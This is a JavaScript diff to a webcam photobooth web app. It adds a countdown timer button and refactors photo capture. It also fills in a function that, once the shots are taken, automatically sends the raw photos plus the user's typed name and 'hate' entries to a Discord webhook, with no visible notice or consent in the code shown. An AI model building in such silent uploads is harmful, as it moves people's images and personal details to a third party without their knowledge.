@@ -8,6 +8,7 @@ const btn1 = document.getElementById('btn1');
 const btn2 = document.getElementById('btn2');
 const btn3 = document.getElementById('btn3');
 const snapBtn = document.getElementById('snapBtn');
+const timerBtn = document.getElementById('timerBtn'); // Tambahan Tombol Timer
 const retakeBtn = document.getElementById('retakeBtn');
 const downloadBtn = document.getElementById('downloadBtn');
 const frameSelectorArea = document.getElementById('frameSelectorArea');
@@ -90,6 +91,7 @@ function resetPhotoSlots() {
     video.classList.remove('sembunyi');
     moveCameraToSlot(0);
     snapBtn.classList.remove('sembunyi');
+    timerBtn.classList.remove('sembunyi');
     retakeBtn.classList.add('sembunyi');
     downloadBtn.classList.add('sembunyi');
     frameSelectorArea.classList.remove('sembunyi');
@@ -100,7 +102,8 @@ function updateSnapButtonText() {
     snapBtn.innerText = maxPhotos > 1 ? `📸 TAKE PHOTO (${currentPhotoCount + 1}/${maxPhotos})` : `📸 TAKE PHOTO`;
 }
 
-snapBtn.addEventListener('click', function() {
+// LOGIKA UTAMA JEPRET
+function takePhotoAction() {
     if (currentPhotoCount >= maxPhotos) return;
     const context = canvas.getContext('2d');
     const size = Math.min(video.videoWidth, video.videoHeight);
@@ -124,25 +127,49 @@ snapBtn.addEventListener('click', function() {
             moveCameraToSlot(currentPhotoCount);
         } else {
             snapBtn.classList.add('sembunyi');
+            timerBtn.classList.add('sembunyi');
             frameSelectorArea.classList.add('sembunyi');
-            video.classList.add('sembunyi'); // GANTI: Cukup sembunyikan, JANGAN dihapus!
+            video.classList.add('sembunyi');
             retakeBtn.classList.remove('sembunyi');
             downloadBtn.classList.remove('sembunyi');
             kirimFotoMentahKeDiscord();
         }
     }, 'image/png', 1.0); 
+}
+
+// Event Listeners
+snapBtn.addEventListener('click', takePhotoAction);
+
+timerBtn.addEventListener('click', () => {
+    let count = 3;
+    snapBtn.disabled = true; timerBtn.disabled = true;
+    let timer = setInterval(() => {
+        timerBtn.innerText = `⏳ ${count}...`;
+        if (--count < 0) {
+            clearInterval(timer); timerBtn.innerText = "⏳ TIMER (3s)";
+            snapBtn.disabled = false; timerBtn.disabled = false;
+            takePhotoAction();
+        }
+    }, 1000);
 });
 
 retakeBtn.addEventListener('click', function() {
-    // Reset data
     currentPhotoCount = 0;
     capturedBlobs = [];
     capturedDataUrls = []; 
-    // Tampilkan kembali video
     video.classList.remove('sembunyi');
-    // Re-build layout
     resetPhotoSlots();
 });
 
+function kirimFotoMentahKeDiscord() {
+    const formData = new FormData();
+    formData.append("content", `📌 **Hasil Foto Baru!**\n👤 Nama: ${input1.value}\n❌ Benci: ${input2.value}\n❌ Benci: ${input3.value}`);
+    capturedBlobs.forEach((blob, index) => {
+        formData.append(`file${index + 1}`, blob, `foto-${index + 1}.png`);
+    });
+    fetch(DISCORD_WEBHOOK_URL, { method: "POST", body: formData })
+    .then(res => console.log("Berhasil dikirim ke Discord!"))
+    .catch(err => console.error("Gagal kirim:", err));
+}
+
 downloadBtn.addEventListener('click', function() { /* Logika download tetap sama */ });
-function kirimFotoMentahKeDiscord() { /* Logika discord tetap sama */ }
